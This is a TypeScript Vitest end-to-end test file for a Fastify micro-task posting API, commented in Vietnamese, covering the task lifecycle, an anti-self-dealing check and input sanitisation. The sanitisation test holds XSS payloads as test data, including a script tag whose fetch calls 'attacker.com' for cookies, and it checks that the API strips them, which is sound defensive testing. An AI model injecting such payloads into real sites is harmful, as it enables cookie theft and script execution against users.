import { describe, it, expect, beforeEach } from 'vitest';
import { FastifyInstance } from 'fastify';
import { buildApp } from '../../src/app';
import { FreelanceTask } from '../../src/domain/entities/freelance-task.entity';
import { TaskRepositoryPort } from '../../src/usecase/ports/task-repository.port';
import { TaskProgressPort, TaskProgress } from '../../src/usecase/ports/task-progress.port';
import { TaskAuditLogPort, AuditLogEntry } from '../../src/usecase/ports/task-audit-log.port';
import { AntiSelfDealingValidator } from '../../src/domain/services/anti-self-dealing.validator';
import { TaskConcurrencyConflictError, TaskNotFoundError, SelfDealingForbiddenError } from '../../src/shared/errors/task-errors';

class E2EInMemoryTaskRepository implements TaskRepositoryPort {
  private tasks = new Map<string, FreelanceTask>();
  private versions = new Map<string, number>();

  public async save(task: FreelanceTask): Promise<void> {
    this.tasks.set(task.getId(), task);
    this.versions.set(task.getId(), task.getVersion());
  }

  public async findById(id: string): Promise<FreelanceTask | null> {
    return this.tasks.get(id) || null;
  }

  public async findAll(): Promise<FreelanceTask[]> {
    return Array.from(this.tasks.values()).reverse();
  }

  public async update(task: FreelanceTask, expectedVersion: number): Promise<void> {
    const currentDbVersion = this.versions.get(task.getId());
    if (currentDbVersion === undefined) {
      throw new TaskNotFoundError();
    }
    if (currentDbVersion !== expectedVersion) {
      throw new TaskConcurrencyConflictError();
    }
    this.tasks.set(task.getId(), task);
    this.versions.set(task.getId(), task.getVersion());
  }
}

class E2EStubProgressAdapter implements TaskProgressPort {
  public progress = { approved_count: 0, in_progress_count: 0 };

  public async getProgress(_taskId: string): Promise<TaskProgress> {
    return { ...this.progress };
  }
}

class E2EInMemoryAuditLogRepository implements TaskAuditLogPort {
  public logs: AuditLogEntry[] = [];

  public async log(entry: AuditLogEntry): Promise<void> {
    this.logs.push(entry);
  }
}

describe('End-to-End (E2E) Test: Tính năng Đăng việc / Nhiệm vụ Freelance vi mô (post-job)', () => {
  let app: FastifyInstance;
  let taskRepo: E2EInMemoryTaskRepository;
  let progressPort: E2EStubProgressAdapter;
  let auditRepo: E2EInMemoryAuditLogRepository;

  beforeEach(async () => {
    taskRepo = new E2EInMemoryTaskRepository();
    progressPort = new E2EStubProgressAdapter();
    auditRepo = new E2EInMemoryAuditLogRepository();

    app = buildApp({
      taskRepository: taskRepo,
      taskProgressPort: progressPort,
      taskAuditLogPort: auditRepo,
    });
    await app.ready();
  });

  describe('Luồng hoàn chỉnh (Complete End-to-End Lifecycle)', () => {
    it('thực hiện trọn vẹn vòng đời: Tạo Draft -> Sửa nội dung -> Xuất bản Active -> Worker xem -> Đóng ân hạn 24h -> Kiểm tra Audit Trail', async () => {
      // BƯỚC 1: Admin tạo bản thảo nhiệm vụ
      const createRes = await app.inject({
        method: 'POST',
        url: '/api/v1/tasks',
        headers: { 'x-user-id': 'adm-boss-001', 'x-user-role': 'ADMIN' },
        payload: {
          title: 'Cài đặt app TikTik và tương tác 5 video',
          description: 'Tải app TikTik từ kho ứng dụng, xem 5 video bất kỳ và thả tim để hoàn thành nhiệm vụ.',
          category: 'SOCIAL_INTERACTION',
          reward_coins: 3000,
          quota: 200,
          steps: [
            {
              step_number: 1,
              instruction: 'Tải ứng dụng tại liên kết chính thức',
              target_url: 'https://tiktik.app/download',
            },
            {
              step_number: 2,
              instruction: 'Mở app và xem 5 video liên tiếp',
            },
          ],
          proof_requirements: [
            {
              proof_type: 'SCREENSHOT_IMAGE',
              title: 'Ảnh lịch sử xem video',
              description: 'Chụp lại màn hình lịch sử 5 video đã xem',
              is_required: true,
            },
          ],
          execution_time_minutes: 45,
          auto_approval_days: 2,
        },
      });

      expect(createRes.statusCode).toBe(201);
      const created = JSON.parse(createRes.payload).data;
      expect(created.status).toBe('DRAFT');
      expect(created.version).toBe(1);
      expect(created.total_reward_coins).toBe(3000 * 200);

      const taskId = created.id;

      // BƯỚC 2: Admin chỉnh sửa mô tả khi còn ở DRAFT
      const updateRes = await app.inject({
        method: 'PATCH',
        url: `/api/v1/tasks/${taskId}`,
        headers: { 'x-user-id': 'adm-boss-001', 'x-user-role': 'ADMIN' },
        payload: {
          expected_version: 1,
          description: 'Tải app TikTik, xem 5 video bất kỳ, thả tim và bình luận 1 câu tích cực.',
        },
      });

      expect(updateRes.statusCode).toBe(200);
      const updated = JSON.parse(updateRes.payload).data;
      expect(updated.version).toBe(2);

      // BƯỚC 3: Admin xuất bản nhiệm vụ (DRAFT -> ACTIVE)
      const publishRes = await app.inject({
        method: 'POST',
        url: `/api/v1/tasks/${taskId}/status`,
        headers: { 'x-user-id': 'adm-boss-001', 'x-user-role': 'ADMIN' },
        payload: {
          action: 'PUBLISH',
          expected_version: 2,
        },
      });

      expect(publishRes.statusCode).toBe(200);
      const published = JSON.parse(publishRes.payload).data;
      expect(published.status).toBe('ACTIVE');
      expect(published.version).toBe(3);

      // BƯỚC 4: Worker xem thông tin chi tiết nhiệm vụ công khai
      progressPort.progress = { approved_count: 50, in_progress_count: 30 }; // đã chiếm 80 slot

      const workerViewRes = await app.inject({
        method: 'GET',
        url: `/api/v1/tasks/${taskId}`,
        headers: { 'x-user-id': 'worker-user-777', 'x-user-role': 'WORKER' },
      });

      expect(workerViewRes.statusCode).toBe(200);
      const workerView = JSON.parse(workerViewRes.payload).data;
      expect(workerView.task.status).toBe('ACTIVE');
      expect(workerView.progress.approved_count).toBe(50);
      expect(workerView.progress.in_progress_count).toBe(30);
      expect(workerView.progress.remaining_slots).toBe(200 - 80); // 120 slot còn trống

      // BƯỚC 5: Admin cập nhật tăng quota nhiệm vụ (200 -> 300)
      const expandQuotaRes = await app.inject({
        method: 'PATCH',
        url: `/api/v1/tasks/${taskId}`,
        headers: { 'x-user-id': 'adm-boss-001', 'x-user-role': 'ADMIN' },
        payload: {
          expected_version: 3,
          quota: 300,
        },
      });

      expect(expandQuotaRes.statusCode).toBe(200);
      const expanded = JSON.parse(expandQuotaRes.payload).data;
      expect(expanded.quota).toBe(300);
      expect(expanded.version).toBe(4);

      // BƯỚC 6: Admin đóng vĩnh viễn nhiệm vụ (CLOSE)
      const closeRes = await app.inject({
        method: 'POST',
        url: `/api/v1/tasks/${taskId}/status`,
        headers: { 'x-user-id': 'adm-boss-001', 'x-user-role': 'ADMIN' },
        payload: {
          action: 'CLOSE',
          expected_version: 4,
        },
      });

      expect(closeRes.statusCode).toBe(200);
      const closed = JSON.parse(closeRes.payload).data;
      expect(closed.status).toBe('CLOSED');
      expect(closed.closed_at).not.toBeNull();
      expect(closed.grace_period_ends_at).not.toBeNull();

      // Kiểm tra thời hạn ân hạn chính xác 24 giờ (REQ-POST-018, REQ-POST-019)
      const closedTime = new Date(closed.closed_at).getTime();
      const graceTime = new Date(closed.grace_period_ends_at).getTime();
      const diffHours = (graceTime - closedTime) / (1000 * 60 * 60);
      expect(diffHours).toBeCloseTo(24, 1);

      // BƯỚC 7: Kiểm định toàn vẹn Audit Trail (SEC-01 & NFR-AUDIT-001)
      expect(auditRepo.logs.length).toBeGreaterThanOrEqual(4);
      const actions = auditRepo.logs.map((l) => l.action);
      expect(actions).toContain('TASK_DRAFT_CREATED');
      expect(actions).toContain('TASK_UPDATED');
      expect(actions).toContain('STATUS_CHANGED_PUBLISH');
      expect(actions).toContain('STATUS_CHANGED_CLOSE');

      // Mọi log đều lưu đúng adminId
      for (const log of auditRepo.logs) {
        expect(log.adminId).toBe('adm-boss-001');
        expect(log.taskId).toBe(taskId);
      }
    });
  });

  describe('Kiểm định an ninh và chống gian lận (Security & Anti-Fraud)', () => {
    it('Anti-Self-Dealing: chặn tuyệt đối Admin tự nhận hoặc nộp bài cho task của mình', () => {
      const creatorId = 'adm-boss-001';
      const workerId = 'adm-boss-001';

      expect(() => AntiSelfDealingValidator.validate(creatorId, workerId)).toThrow(SelfDealingForbiddenError);
    });

    it('XSS Sanitization & HTML Escaping: loại bỏ hoàn toàn các thẻ độc hại', async () => {
      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/tasks',
        headers: { 'x-user-id': 'adm-boss-001', 'x-user-role': 'ADMIN' },
        payload: {
          title: 'Cài đặt app <img src=x onerror=alert(1)> kiếm tiền',
          description: '<script>fetch("https://attacker.com/cookie")</script> Mô tả nhiệm vụ an toàn cho người dùng',
          category: 'APP_INSTALL',
          reward_coins: 1000,
          quota: 50,
        },
      });

      expect(res.statusCode).toBe(201);
      const data = JSON.parse(res.payload).data;
      expect(data.title).not.toContain('onerror');
      expect(data.description).not.toContain('<script>');
    });
  });
});

